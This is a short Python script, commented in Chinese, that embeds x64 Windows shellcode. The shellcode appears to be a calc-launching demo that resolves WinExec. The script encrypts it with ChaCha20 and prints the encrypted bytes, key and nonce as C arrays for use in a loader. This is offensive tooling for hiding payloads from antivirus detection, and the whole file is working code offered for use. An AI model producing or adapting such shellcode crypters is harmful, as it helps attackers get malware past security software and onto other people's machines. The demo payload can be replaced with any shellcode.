import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from cryptography.hazmat.backends import default_backend

shellcode = [
0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
]
shellcode_bytes = bytes(shellcode)

# 生成随机密钥（32 字节）和 nonce（16 字节）
key = os.urandom(32)
nonce = os.urandom(16)

# 验证长度
assert len(key) == 32, "密钥必须是 32 字节"
assert len(nonce) == 16, "Nonce 必须是 16 字节"

# 创建 ChaCha20 加密器
cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
encryptor = cipher.encryptor()

# 加密 shellcode
encrypted_shellcode = encryptor.update(shellcode_bytes)

# 将加密后的 shellcode 格式化为 C 数组
encrypted_array = ', '.join(f'0x{b:02X}' for b in encrypted_shellcode)

# 输出结果
print("unsigned char encrypted_shellcode[] = {")
print(f"    {encrypted_array}")
print("};")
print("\n// 密钥和 nonce：")
print(f"unsigned char key[] = {{ {', '.join(f'0x{b:02X}' for b in key)} }};")
print(f"unsigned char nonce[] = {{ {', '.join(f'0x{b:02X}' for b in nonce)} }};")